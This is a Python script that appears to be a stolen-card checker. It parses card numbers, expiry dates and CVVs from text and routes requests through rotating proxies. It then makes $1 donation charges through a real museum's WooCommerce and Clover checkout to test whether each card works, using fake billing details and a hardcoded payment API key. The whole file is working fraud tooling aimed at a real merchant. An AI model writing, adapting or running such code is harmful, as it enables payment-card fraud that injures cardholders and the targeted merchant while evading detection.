import re, requests, base64, json, time
from bs4 import BeautifulSoup
import random
from typing import List

def create_lista(text: str):
    m = re.findall(r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(("5", "4", "3", "6")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]

def get_proxies(proxies: List[str] = [], proxy_type: str = "http"):
    try:
        file = random.choice(proxies)
        host, port, user, pas = file.split(":")[:4]
        return {
            "proxies": {
                'http': f'{proxy_type}://{user}:{pas}@{host}:{port}',
                'https': f'{proxy_type}://{user}:{pas}@{host}:{port}'
            }
        }
    except Exception as e:
        return {"error": str(e)}

def main(card, proxy=None):
    try:
        cards = create_lista(card)
        if not cards:
            return {'status': 'declined', 'message': 'Invalid card format'}

        cc, mes, ano, cvv = cards[0].split("|")
        ano = f"20{ano}" if len(ano) == 2 else ano

        if cc.startswith("4"):
            brand = "VISA"
        elif cc.startswith("5"):
            brand = "MC"
        elif cc.startswith("34") or cc.startswith("37"):
            brand = "American Express"
        elif cc.startswith("6"):
            brand = "Discover"
        elif cc.startswith("35"):
            brand = "JCB"
        elif cc.startswith("62"):
            brand = "UnionPay"
        elif cc.startswith("3"):
            brand = "JCB or Diners Club"
        else:
            brand = "Unknown"

        r = requests.Session()
        if proxy:
            proxy_dict = get_proxies([proxy]).get("proxies", {})
            r.proxies.update(proxy_dict)

        start = time.time()

        # Step 1: Donation trigger
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://craterrock.com',
            'referer': 'https://craterrock.com/crater-rock-museum/donations/',
            'user-agent': 'Mozilla/5.0',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wdpgk_donation_form',
            'product_id': '5944',
            'price': '1',
            'note': '',
            'redirect_url': 'https://craterrock.com/cart/',
        }
        r.post('https://craterrock.com/wp-admin/admin-ajax.php', headers=headers, data=data)

        # Step 2: Get nonce
        response = r.get('https://craterrock.com/checkout/', headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        input_element = soup.find('input', {'id': 'woocommerce-process-checkout-nonce'})
        nonce_value = input_element['value'] if input_element else None

        # Step 3: Encrypt PAN via external /enc API
        enc_res = requests.get(f"http://127.0.0.1:1141/enc?cc={cc}")
        if enc_res.status_code != 200:
            return {'status': 'declined', 'message': 'Encryption API error'}
        encrypted_pan = enc_res.json().get("encrypted_pan")

        fir = cc[:6]
        las = cc[-4:]

        # Step 4: Get Clover token
        headers = {
            'accept': '*/*',
            'apikey': 'da36ec8b672992effe29172870c23bd7',
            'content-type': 'application/json',
            'origin': 'https://checkout.clover.com',
            'referer': 'https://checkout.clover.com/',
            'user-agent': 'Mozilla/5.0',
            'x-clover-client-type': 'HOSTED_IFRAME',
        }
        json_data = {
            'card': {
                'encrypted_pan': encrypted_pan,
                'exp_month': mes,
                'exp_year': ano,
                'cvv': cvv,
                'first6': int(fir),
                'last4': int(las),
                'brand': brand,
                'address_zip': '10080',
            },
        }
        token_resp = r.post('https://token.clover.com/v1/tokens', headers=headers, json=json_data)
        token_id = token_resp.json().get('id')

        # Step 5: Final checkout
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://craterrock.com',
            'referer': 'https://craterrock.com/checkout/',
            'user-agent': 'Mozilla/5.0',
            'x-requested-with': 'XMLHttpRequest',
        }

        params = {'wc-ajax': 'checkout'}

        card_json = json.dumps({
            "exp_month": mes,
            "exp_year": ano,
            "first6": fir,
            "last4": las,
            "brand": brand,
            "address_zip": "10080"
        }).replace('"', '%22').replace(':', '%3A').replace(',', '%2C')

        data = (
    f'billing_first_name=luck&billing_last_name=yk'
    f'&billing_company=&billing_country=US&billing_address_1=street+157'
    f'&billing_address_2=&billing_city=new+york&billing_state=NY&billing_postcode=10080'
    f'&billing_phone=6025874581&billing_email=sellifggf%40aka.ms'
    f'&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US'
    f'&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=OR&shipping_postcode='
    f'&shipping_phone=&order_comments=&shipping_method[0]=free_shipping:1'
    f'&payment_method=woocci_zaytech&woocommerce-process-checkout-nonce={nonce_value}'
    f'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
    f'&clover-source={token_id}&clover-card={card_json}'
)


        final = r.post('https://craterrock.com/', params=params, headers=headers, data=data)
        end = time.time()

        if 'success' in final.text:
            return {'status': 'success', 'message': 'charged 1$ ✅', 'time': f'{end - start:.2f}s'}
        else:
            jso = json.loads(final.text)
            raw = jso.get("messages", "")
            msg = re.sub('<[^<]+?>', '', raw).strip()
            return {'status': 'declined', 'message': msg, 'time': f'{end - start:.2f}s'}

    except Exception as e:
        return {'status': 'error', 'message': str(e)}

def run(card, proxy=None):
    return main(card, proxy)
